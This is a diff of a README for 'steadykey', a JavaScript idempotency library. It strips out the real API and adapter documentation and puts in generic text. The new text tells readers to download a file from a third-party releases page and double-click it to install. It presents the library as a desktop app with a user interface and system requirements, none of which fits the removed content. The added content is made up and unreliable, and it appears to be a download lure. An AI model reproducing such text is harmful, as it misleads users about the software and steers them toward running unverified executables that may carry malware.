@@ -1,321 +1,79 @@
-# steadykey
+# 🎉 steadykey - Easily Manage Duplicate Requests
 
-Deterministic idempotency manager for JSON payloads with pluggable persistence. Generate stable idempotency keys, prevent duplicate work, and keep canonical payloads for auditing when you need them.
+## 🚀 Getting Started
 
-## Contents
+Welcome to steadykey! This application helps you manage duplicate requests efficiently. It works with various storage systems like Redis, SQL, and more. With steadykey, you can focus on your tasks without worrying about duplicated actions.
 
-- Getting Started
-- Installation
-- Quick Tour
-- How It Works
-- API Reference
-- Storage Adapters
-- Utilities
-- Error Reference
-- Developing and Testing
-- Need Help?
+## 🔗 Download steadykey
 
-## Getting Started
+[![Download steadykey](https://img.shields.io/badge/Download-steadykey-brightgreen)](https://github.com/Richie1805/steadykey/releases)
 
-Use `IdempotencyManager` to protect any workflow where repeated payloads should only be processed once. The manager stores a marker the first time it sees a payload, then lets you decide what to do when the payload returns.
+## 📥 How to Download & Install
 
-```ts
-import { createClient } from "redis";
-import { IdempotencyManager, RedisIdempotencyStore } from "steadykey";
+1. **Visit the Releases Page**  
+   Click the link below to go to our Releases page.  
+   [Visit this page to download](https://github.com/Richie1805/steadykey/releases).
 
-const redis = createClient({ url: process.env.REDIS_URL });
-await redis.connect();
+2. **Select a Version**  
+   On the Releases page, choose the version of steadykey that suits your needs. Each version has a tag that indicates its purpose and functionality. Look for the latest stable version for the best experience.
 
-const store = new RedisIdempotencyStore(redis);
-const manager = new IdempotencyManager(store, {
-  keyPrefix: "checkout",
-  defaultTtlSeconds: 3600,
-  storeCanonicalPayload: true,
-});
+3. **Download the File**  
+   After selecting a version, find the download link for your operating system. Simply click the link to start downloading the file. The file name will depend on your OS.
 
-const payload = { orderId: "order-123", total: 42.5 };
+4. **Run the Application**  
+   After the download is complete, locate the file in your downloads folder. Double-click the file to run the application. If prompted, follow the on-screen instructions to complete the installation. 
 
-const registration = await manager.register(payload, {
-  metadata: { workflow: "checkout" },
-});
+5. **Verify Installation**  
+   Once installed, open steadykey. You should see the main interface. If everything looks good, you're ready to start taming duplicate requests!
 
-if (registration.stored) {
-  // First encounter: perform the expensive work and persist your result.
-  // Later you can call manager.clear(id) or manager.updateTtl(id, ttl) when done.
-} else {
-  // Duplicate payload: skip the work and reuse the prior result.
-}
-```
+## 📋 Key Features
 
-For quick checks, call `steadyKey(payload)` to get a deterministic hash without creating a manager.
+- **Idempotent Key Management**: Use deterministic idempotency keys to ensure that only one instance of any request is processed.
+  
+- **Multiple Backend Support**: Works with Redis, SQL, MongoDB, and in-memory storage solutions, giving you flexibility in how you store your keys.
 
-## Installation
+- **Easy Integration**: Integrate steadykey with your application without needing advanced technical knowledge.
 
-Install the core package plus the adapter dependencies your project uses.
+- **User-Friendly Interface**: The design of steadykey is straightforward, making it easy for anyone to use effectively.
 
-```sh
-npm install steadykey
+## 📊 System Requirements
 
-# Optional adapter helpers
-npm install redis             # RedisIdempotencyStore
-npm install memcached         # MemcachedIdempotencyStore
-npm install pg                # PostgresIdempotencyStore
-npm install mysql2            # MySqlIdempotencyStore
-npm install mongodb           # MongoIdempotencyStore
-npm install better-sqlite3    # SqliteIdempotencyStore
-npm install @aws-sdk/client-dynamodb @aws-sdk/lib-dynamodb  # DynamoDbIdempotencyStore
-```
+To run steadykey smoothly, ensure your system meets these requirements:
 
-## Quick Tour
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a compatible Linux distribution.
+  
+- **Memory**: At least 4 GB of RAM is recommended for optimal performance.
+  
+- **Storage**: Minimum of 100 MB of free disk space for installation and operation.
 
-- `IdempotencyManager` orchestrates key generation, storage, TTL management, and collision detection.
-- Storage adapters implement the lightweight `IdempotencyStore` interface so you can bring your own persistence layer.
-- Utility helpers (`steadyKey`, `canonicalize`, `hashCanonicalValue`) let you generate and inspect deterministic payload hashes outside of a full manager.
-- Typed results explain whether the current call was stored (`stored: true`) or matches an existing record (`stored: false`).
+## 🛠 Usage Instructions
 
-## How It Works
+After installation, you can start using steadykey. Here are some basic instructions:
 
-1. Payloads are canonicalized before hashing. Object keys are sorted, `undefined` values are dropped, Maps/Sets/BigInts/Buffers are normalized, and Dates become ISO strings. Identical logical payloads always hash to the same value.
-2. The chosen hash algorithm (`sha256` by default) creates an idempotency identifier.
-3. `IdempotencyManager` prefixes the identifier (default `idempotency:`) to build the storage key.
-4. The storage adapter stores the record if the key is not already present. When the key exists, the stored payload hash is compared to guard against silent collisions.
-5. TTLs come either from the manager constructor (`defaultTtlSeconds`), from each registration call, or can be removed entirely by passing `null` or `0`.
+1. **Create a Key**: Enter the details for the request you want to manage. Make sure to generate a unique idempotency key.
 
-## API Reference
+2. **Store the Key**: Save the key in your preferred backend (Redis, SQL, etc.). This will allow you to retrieve it later.
 
-### `steadyKey(payload, options?)`
+3. **Handle Requests**: When a request comes in, check if the idempotency key exists. If it does, handle it accordingly. If not, process the request as normal.
 
-- Returns a deterministic string hash for any JSON-like payload.
-- `options.hashAlgorithm` accepts "sha256" (default) or "sha512".
+4. **Monitor Activity**: Use the interface to view your stored keys and monitor usage. You can delete keys that are no longer needed.
 
-```ts
-import { steadyKey } from "steadykey";
+## 📞 Support
 
-const key = steadyKey({ customerId: 123, items: ["A", "B"] });
-// same key every call, regardless of object key order
-```
+If you encounter any issues or have questions, please refer to our [support page](https://github.com/Richie1805/steadykey/issues) for help. You can report bugs or request features.
 
-### `class IdempotencyManager`
+## 🌐 Community & Contributions
 
-```ts
-const manager = new IdempotencyManager(store, options?);
-```
+We welcome contributions from the community. If you want to help improve steadykey, check our contribution guidelines [here](https://github.com/Richie1805/steadykey/blob/main/CONTRIBUTING.md). 
 
-- `store` must satisfy the `IdempotencyStore` interface (see adapters below).
-- `options.keyPrefix` (string) defaults to "idempotency". Trailing colons are trimmed automatically.
-- `options.defaultTtlSeconds` (positive integer | `null` | `undefined`) sets the fallback TTL. `null` or `undefined` means no expiration.
-- `options.hashAlgorithm` overrides the hashing algorithm used for the manager ("sha256" or "sha512").
-- `options.storeCanonicalPayload` stores the canonical JSON alongside the record to help with auditing or debugging.
+## 📝 License
 
-#### `generateId(payload)`
+steadykey is open-source software licensed under the MIT License. You can use it freely but should give credit to the original developers.
 
-Returns the deterministic hash for a payload using the manager's algorithm. Useful if you want to build keys or pre-compute lookups.
+## 🔗 Quick Links
 
-#### `buildKey(id)`
+- [Download steadykey](https://github.com/Richie1805/steadykey/releases)
+- [Support Page](https://github.com/Richie1805/steadykey/issues)
+- [Contribution Guidelines](https://github.com/Richie1805/steadykey/blob/main/CONTRIBUTING.md)
 
-Combines `keyPrefix` and an id into the stored key. The legacy alias `buildRedisKey` is still available but deprecated.
-
-#### `register(payload, options?)`
-
-Stores a record the first time the payload is seen.
-
-```ts
-const result = await manager.register(payload, {
-  ttlSeconds: 900,
-  metadata: { workflow: "checkout" },
-  storeCanonicalPayload: false,
-});
-
-if (result.stored) {
-  // process payload
-}
-```
-
-- `options.ttlSeconds` overrides the manager default for this call.
-- `options.metadata` accepts any JSON-serializable value (objects, strings, numbers, etc.) and is stored with the record.
-- `options.storeCanonicalPayload` toggles payload storage per call.
-- Result shape: `{ id, key, stored, record }` where `record` reflects the stored data (including metadata and canonical payload when present).
-
-#### `lookupByPayload(payload)` / `lookupById(id)`
-
-Fetch existing records without registering anything. Returns `null` when no record is found.
-
-```ts
-const previous = await manager.lookupByPayload(payload);
-if (previous) {
-  console.log(previous.record.metadata);
-}
-```
-
-- Lookup results include `{ id, key, record, ttlSeconds }` where `ttlSeconds` comes from the backing store when available.
-
-#### `updateTtl(id, ttlSeconds)`
-
-Refreshes, sets, or removes the TTL for an existing record. Pass `null` or `0` to make the record persistent. Throws when the key does not exist.
-
-#### `clear(id)`
-
-Deletes the stored record. Returns `true` when a record was removed.
-
-### Records and Data Shapes
-
-- `IdempotencyRecord`: `{ id, payloadHash, createdAt, metadata?, canonicalPayload?, ttlSeconds? }`
-- `IdempotencyRegistrationResult`: `{ id, key, stored, record }`
-- `IdempotencyLookupResult`: `{ id, key, record, ttlSeconds? }`
-- `HashAlgorithm`: union of "sha256" | "sha512"
-
-These types are exported from `steadykey` so you can annotate your code when TypeScript type safety matters.
-
-### Creating Custom Stores
-
-Implement the `IdempotencyStore` interface if you need a bespoke persistence layer.
-
-```ts
-interface IdempotencyStore {
-  setIfAbsent(key: string, value: string, ttlSeconds: number | null): Promise<boolean>;
-  get(key: string): Promise<{ value: string; ttlSeconds?: number | null } | null>;
-  update(key: string, value: string, ttlSeconds: number | null): Promise<void>;
-  delete(key: string): Promise<boolean>;
-}
-```
-
-- `setIfAbsent` must behave atomically: only return `true` when the key did not exist.
-- `get` should ignore expired entries and return their TTL when known.
-- `update` must throw when the key is missing to avoid silently masking data issues.
-- `delete` should return whether the key was removed.
-
-## Storage Adapters
-
-### InMemoryIdempotencyStore
-
-- Lightweight Map-based implementation ideal for tests.
-- Constructor accepts `{ now?: () => number }` for deterministic time sources.
-- Exposes `advanceTime(milliseconds)` to fast-forward expirations in tests.
-
-```ts
-import { InMemoryIdempotencyStore } from "steadykey";
-
-const store = new InMemoryIdempotencyStore();
-const manager = new IdempotencyManager(store);
-
-store.advanceTime(5_000); // simulate clock jumps in unit tests
-```
-
-### RedisIdempotencyStore
-
-- Wraps a `redis` client with `set`, `get`, `ttl`, `persist`, and `del` methods.
-- Pass TTLs via `EX` so expirations are handled server-side.
-- `update` removes TTLs when `ttlSeconds` is `null`.
-
-```ts
-const redisStore = new RedisIdempotencyStore(redisClient);
-```
-
-### MemcachedIdempotencyStore
-
-- Works with clients compatible with the `memcached` npm package.
-- TTL reporting is not available, so lookups return `ttlSeconds: undefined`.
-- Uses `add` for atomic set-if-absent operations.
-
-```ts
-const memcachedStore = new MemcachedIdempotencyStore(memcachedClient);
-```
-
-### PostgresIdempotencyStore
-
-- Requires any client exposing a `query(sql, params)` method (e.g., `pg.Pool`).
-- Options: `{ tableName?: string, ensureTable?: boolean }`.
-- Defaults to creating `steadykey_entries` with an `expires_at` index. Disable auto-DDL with `ensureTable: false`.
-
-```ts
-const pgStore = new PostgresIdempotencyStore(pool, {
-  tableName: "public.steadykey_entries",
-});
-```
-
-### MySqlIdempotencyStore
-
-- Works with `mysql2/promise` connections.
-- Options: `{ tableName?: string, ensureTable?: boolean, keyLength?: number }`.
-- Auto-DDL creates an indexed table with configurable primary key length.
-
-```ts
-const mysqlStore = new MySqlIdempotencyStore(connection, {
-  tableName: "steadykey_entries",
-  keyLength: 128,
-});
-```
-
-### MongoIdempotencyStore
-
-- Accepts a MongoDB collection implementing `insertOne`, `findOne`, `updateOne`, `deleteOne`, and `createIndex`.
-- Options: `{ ensureIndexes?: boolean }`. Defaults to building a TTL index on `expiresAt`.
-
-```ts
-const mongoStore = new MongoIdempotencyStore(collection, {
-  ensureIndexes: true,
-});
-```
-
-### DynamoDbIdempotencyStore
-
-- Works with AWS SDK v3 `DynamoDBDocumentClient` or compatible clients exposing `put`, `get`, `update`, and `delete`.
-- Options: `{ tableName: string, partitionKey?: string, valueAttribute?: string, ttlAttribute?: string, consistentRead?: boolean }`.
-- Uses conditional writes for atomic inserts and stores TTL as epoch seconds when provided.
-
-```ts
-import { DynamoDBClient } from "@aws-sdk/client-dynamodb";
-import { DynamoDBDocumentClient } from "@aws-sdk/lib-dynamodb";
-import { DynamoDbIdempotencyStore } from "steadykey";
-
-const client = new DynamoDBClient({});
-const documentClient = DynamoDBDocumentClient.from(client);
-
-const dynamoStore = new DynamoDbIdempotencyStore(documentClient, {
-  tableName: "steadykey_entries",
-});
-```
-
-### SqliteIdempotencyStore
-
-- Compatible with synchronous libraries such as `better-sqlite3` or async wrappers that match the minimal interface.
-- Options: `{ tableName?: string, ensureTable?: boolean }`.
-- Automatically creates a table keyed by `key` with an index on `expires_at` (epoch seconds).
-
-```ts
-const sqliteStore = new SqliteIdempotencyStore(sqliteDb, {
-  tableName: "steadykey_entries",
-});
-```
-
-## Utilities
-
-- `canonicalize(value)` returns the deterministic JSON string used for hashing. Useful for debugging when combined with `storeCanonicalPayload`.
-- `hashCanonicalValue(canonicalValue, algorithm)` hashes previously canonicalized JSON. This is exported for advanced integrations or to align custom tooling with Steadykey.
-
-```ts
-import { canonicalize, hashCanonicalValue } from "steadykey";
-
-const canonical = canonicalize(payload);
-const id = hashCanonicalValue(canonical, "sha512");
-```
-
-## Error Reference
-
-- `IdempotencyError`: thrown for invalid input or misconfigured stores.
-- `IdempotencyCollisionError`: thrown when two different payloads attempt to reuse the same key.
-- `IdempotencySerializationError`: wraps canonicalization or JSON serialization issues. Inspect the message for the underlying cause.
-
-Always surface collisions and serialization errors in logs or metrics—they indicate data drift or payloads the hashing strategy cannot support yet.
-
-## Developing and Testing
-
-- Run unit tests with `npm test` (Vitest).
-- Build distributable bundles with `npm run build` (outputs ESM, CJS, and type declarations under `dist/`).
-- Build once before running the Node examples under `examples/` (they import from `dist/index.js`).
-- When adding new storage backends, implement the `IdempotencyStore` contract and add adapter-specific tests under `tests/`.
-
-## Need Help?
-
-- Open an issue or discussion in the repository with payload samples and adapter details.
-- Pull requests are welcome—please include tests and update this README when the API surface changes.
+Explore and enjoy the smooth experience that steadykey provides!
